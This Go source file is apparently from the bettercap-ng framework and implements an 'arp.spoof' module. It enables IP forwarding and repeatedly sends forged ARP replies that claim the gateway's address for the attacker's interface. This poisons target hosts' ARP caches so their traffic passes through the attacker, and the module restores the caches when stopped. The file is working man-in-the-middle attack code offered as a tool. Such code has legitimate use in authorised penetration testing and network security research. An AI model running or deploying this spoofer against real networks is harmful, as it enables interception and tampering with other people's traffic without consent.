package modules

import (
	"fmt"
	"net"
	"time"

	"github.com/evilsocket/bettercap-ng/log"
	network "github.com/evilsocket/bettercap-ng/net"
	"github.com/evilsocket/bettercap-ng/packets"
	"github.com/evilsocket/bettercap-ng/session"

	"github.com/malfunkt/iprange"
)

type ArpSpoofer struct {
	session.SessionModule
	done      chan bool
	addresses []net.IP
}

func NewArpSpoofer(s *session.Session) *ArpSpoofer {
	p := &ArpSpoofer{
		SessionModule: session.NewSessionModule("arp.spoof", s),
		done:          make(chan bool),
		addresses:     make([]net.IP, 0),
	}

	p.AddParam(session.NewStringParameter("arp.spoof.targets", session.ParamSubnet, "", "IP addresses to spoof."))

	p.AddHandler(session.NewModuleHandler("arp.spoof on", "",
		"Start ARP spoofer.",
		func(args []string) error {
			return p.Start()
		}))

	p.AddHandler(session.NewModuleHandler("arp.spoof off", "",
		"Stop ARP spoofer.",
		func(args []string) error {
			return p.Stop()
		}))

	return p
}

func (p ArpSpoofer) Name() string {
	return "arp.spoof"
}

func (p ArpSpoofer) Description() string {
	return "Keep spoofing selected hosts on the network."
}

func (p ArpSpoofer) Author() string {
	return "Simone Margaritelli <evilsocket@protonmail.com>"
}

func (p *ArpSpoofer) shouldSpoof(ip net.IP) bool {
	addr := ip.String()
	if ip.IsLoopback() == true {
		return false
	} else if addr == p.Session.Interface.IpAddress {
		return false
	} else if addr == p.Session.Gateway.IpAddress {
		return false
	}
	return true
}

func (p *ArpSpoofer) getMAC(ip net.IP, probe bool) (net.HardwareAddr, error) {
	var mac string
	var hw net.HardwareAddr
	var err error

	// do we have this ip mac address?
	mac, err = network.ArpLookup(p.Session.Interface.Name(), ip.String(), false)
	if err != nil && probe == true {
		from := p.Session.Interface.IP
		from_hw := p.Session.Interface.HW

		if err, probe := packets.NewUDPProbe(from, from_hw, ip, 139); err != nil {
			log.Error("Error while creating UDP probe packet for %s: %s", ip.String(), err)
		} else {
			p.Session.Queue.Send(probe)
		}

		time.Sleep(500 * time.Millisecond)

		mac, err = network.ArpLookup(p.Session.Interface.Name(), ip.String(), false)
	}

	if mac == "" {
		return nil, fmt.Errorf("Could not find hardware address for %s.", ip.String())
	}

	mac = network.NormalizeMac(mac)
	hw, err = net.ParseMAC(mac)
	if err != nil {
		return nil, fmt.Errorf("Error while parsing hardware address '%s' for %s: %s", mac, ip.String(), err)
	}

	return hw, nil
}

func (p *ArpSpoofer) sendArp(saddr net.IP, smac net.HardwareAddr, check_running bool, probe bool) {
	for _, ip := range p.addresses {
		if check_running && p.Running() == false {
			return
		} else if p.shouldSpoof(ip) == false {
			log.Debug("Skipping address %s from ARP spoofing.", ip)
			continue
		}

		// do we have this ip mac address?
		hw, err := p.getMAC(ip, probe)
		if err != nil {
			log.Debug("Error while looking up hardware address for %s: %s", ip.String(), err)
			continue
		}

		if err, pkt := packets.NewARPReply(saddr, smac, ip, hw); err != nil {
			log.Error("Error while creating ARP spoof packet for %s: %s", ip.String(), err)
		} else {
			log.Debug("Sending %d bytes of ARP packet to %s:%s.", len(pkt), ip.String(), hw.String())
			p.Session.Queue.Send(pkt)
		}
	}
}

func (p *ArpSpoofer) unSpoof() error {
	from := p.Session.Gateway.IP
	from_hw := p.Session.Gateway.HW

	log.Info("Restoring ARP cache of %d targets.", len(p.addresses))

	p.sendArp(from, from_hw, false, false)

	return nil
}

func (p *ArpSpoofer) Configure() error {
	var err error
	var targets string

	if err, targets = p.StringParam("arp.spoof.targets"); err != nil {
		return err
	}

	list, err := iprange.Parse(targets)
	if err != nil {
		return fmt.Errorf("Error while parsing arp.spoof.targets variable '%s': %s.", targets, err)
	}
	p.addresses = list.Expand()

	if p.Session.Firewall.IsForwardingEnabled() == false {
		log.Info("Enabling forwarding.")
		p.Session.Firewall.EnableForwarding(true)
	}

	return nil
}

func (p *ArpSpoofer) Start() error {
	if p.Running() == true {
		return session.ErrAlreadyStarted
	} else if err := p.Configure(); err != nil {
		return err
	}

	p.SetRunning(true)
	go func() {
		from := p.Session.Gateway.IP
		from_hw := p.Session.Interface.HW

		log.Info("ARP spoofer started, probing %d targets.", len(p.addresses))

		for p.Running() {
			p.sendArp(from, from_hw, true, false)
			time.Sleep(1 * time.Second)
		}

		p.done <- true
	}()

	return nil
}

func (p *ArpSpoofer) Stop() error {
	if p.Running() == false {
		return session.ErrAlreadyStopped
	}

	log.Info("Waiting for ARP spoofer to stop ...")

	p.SetRunning(false)

	<-p.done

	p.unSpoof()

	return nil
}
